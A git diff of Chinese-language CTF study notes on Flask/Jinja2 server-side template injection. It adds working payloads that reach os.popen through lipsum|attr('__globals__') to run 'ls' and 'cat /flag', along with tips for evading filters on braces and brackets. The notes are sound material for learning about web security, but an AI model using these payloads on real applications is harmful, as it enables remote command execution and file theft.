@@ -52,6 +52,25 @@ for target_string in target_strings:
 
 ### 0、基础知识
 
+- `|attr`:替代`.`，如：调用test类中的os方法可以使用：test|attr(参数)
+- `__globals__`:以字典的形式返回当前作用域中的全局变量
+- `__getitem__`:是字典对象内置的方法，用于获取指定键对应的值
+
+##### lipsum
+
+```nginx
+lipsum|attr("__globals__").get("os").popen("ls").read()
+
+# __globals__返回的参数是字典，使用get来获取
+# 配合Unicode编码使用就是把（）中的内容进行编码
+
+{%print(lipsum|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("cat /flag")|attr("read")())%}
+```
+
+
+
+
+
 > ==flash模板注入可利用的Python模块==
 >
 > ==核心：文件读写、命令执行，这两个主要关注：`file`类和`os`类==
@@ -107,6 +126,34 @@ for target_string in target_strings:
 {{system('cat /flag')}}
 
 ```
+
+### Jinja2
+
+**语法方面和flask非常像**
+
+#### 可执行命令的类
+
+
+
+##### 
+
+#### 过滤`{{}}、[]`
+
+- **过滤掉`{{}}`**可使用`{% print() %}`代替
+
+- 过滤掉`[]`可使用`|attr`来调用方法
+
+  - `|attr('__class__') == .__class__`
+  - `|attr` ==也常用于和Unicode编码搭配使用==
+  - 
+
+
+
+
+
+
+
+
 
 ### flask
 
@@ -387,7 +434,7 @@ if __name__ == "__main__":
 
 
 
-### Jinja2
+
 
 
 
